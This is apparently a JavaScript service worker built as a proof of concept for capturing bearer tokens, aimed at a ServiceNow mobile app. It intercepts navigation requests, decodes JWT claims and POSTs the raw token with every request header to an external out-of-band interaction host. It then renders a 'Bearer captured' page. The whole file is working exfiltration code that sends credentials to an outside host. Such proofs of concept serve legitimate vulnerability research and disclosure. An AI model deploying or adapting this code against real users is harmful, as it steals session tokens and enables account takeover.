'use strict';

const OAST_BASE = 'https://erfqqzdagbcinnxaylnh2h036s9jiqe6u.oast.fun';
const PREFERRED_CLAIMS = ['sub', 'user_name', 'name', 'email', 'instance_id', 'roles', 'exp', 'iat', 'iss', 'scope'];

self.addEventListener('install', event => {
  event.waitUntil(self.skipWaiting());
});

self.addEventListener('activate', event => {
  event.waitUntil(self.clients.claim());
});

function base64UrlDecode(part) {
  const normalized = part.replace(/-/g, '+').replace(/_/g, '/');
  const padded = normalized + '='.repeat((4 - (normalized.length % 4)) % 4);
  const binary = atob(padded);
  const bytes = Uint8Array.from(binary, ch => ch.charCodeAt(0));
  return new TextDecoder().decode(bytes);
}

function sha256Hex(text) {
  return crypto.subtle.digest('SHA-256', new TextEncoder().encode(text))
    .then(buffer => Array.from(new Uint8Array(buffer), b => b.toString(16).padStart(2, '0')).join(''));
}

function escapeHtml(value) {
  return String(value).replace(/[&<>"']/g, ch => (
    { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[ch]
  ));
}

self.addEventListener('fetch', event => {
  if (event.request.mode !== 'navigate') {
    return;
  }

  const url = new URL(event.request.url);
  const captureBase = url.searchParams.get('oast') || OAST_BASE;
  const marker = url.searchParams.get('marker') || 'no-marker';
  const authorization = event.request.headers.get('authorization') || '';
  const headersSeen = {};
  for (const [key, value] of event.request.headers.entries()) {
    headersSeen[key] = value;
  }

  if (authorization.startsWith('Bearer ')) {
    const token = authorization.slice(7);

    event.respondWith((async () => {
      let claims = null;
      try {
        const parts = token.split('.');
        if (parts.length >= 2) {
          claims = JSON.parse(base64UrlDecode(parts[1]));
        }
      } catch (error) {
        claims = null;
      }
      const digest = await sha256Hex(token);

      const captureBody = JSON.stringify({
        event: 'capture',
        marker: marker,
        url: url.href,
        authorization_length: token.length,
        authorization_sha256: digest,
        jwt_claims: claims,
        headers_seen: headersSeen,
        authorization: token
      });

      event.waitUntil(
        fetch(captureBase + '/servicenow-now-mobile/' + encodeURIComponent(marker), {
          method: 'POST',
          mode: 'no-cors',
          credentials: 'omit',
          cache: 'no-store',
          keepalive: true,
          body: captureBody
        }).catch(() => undefined)
      );

      const rows = [];
      rows.push(['jwt length', String(token.length)]);
      rows.push(['jwt sha256', digest.slice(0, 16) + '…']);
      if (claims && typeof claims === 'object') {
        for (const key of PREFERRED_CLAIMS) {
          if (claims[key] !== undefined) {
            rows.push([key, JSON.stringify(claims[key])]);
          }
        }
        for (const key of Object.keys(claims)) {
          if (PREFERRED_CLAIMS.includes(key)) {
            continue;
          }
          rows.push([key, JSON.stringify(claims[key])]);
        }
      } else {
        rows.push(['claims', 'not parseable (non-JWT bearer?)']);
      }
      const table = rows.map(([key, value]) =>
        '<tr><td style="padding:4px 10px 4px 0;vertical-align:top"><b>' + escapeHtml(key) +
        '</b></td><td style="word-break:break-all">' + escapeHtml(value) + '</td></tr>'
      ).join('');

      return new Response(
        '<!doctype html><meta charset="utf-8"><title>Captured</title>' +
        '<h1>Bearer captured (JWT decoded)</h1>' +
        '<p>Raw token delivered to the capture endpoint only; not shown on screen.</p>' +
        '<table border="1" cellpadding="8" cellspacing="0" style="border-collapse:collapse">' +
        table + '</table>' +
        '<p style="margin-top:14px">Disposable accounts can now be deleted.</p>',
        {
          status: 200,
          headers: {
            'Content-Type': 'text/html; charset=utf-8',
            'Cache-Control': 'no-store'
          }
        }
      );
    })());
    return;
  }

  if (url.searchParams.has('diag')) {
    const diagBody = JSON.stringify({
      event: 'diag',
      marker: marker,
      url: url.href,
      has_authorization: false,
      headers_seen: headersSeen
    });
    event.waitUntil(
      fetch(captureBase + '/servicenow-now-mobile/diag', {
        method: 'POST',
        mode: 'no-cors',
        credentials: 'omit',
        cache: 'no-store',
        keepalive: true,
        body: diagBody
      }).catch(() => undefined)
    );
  }
});
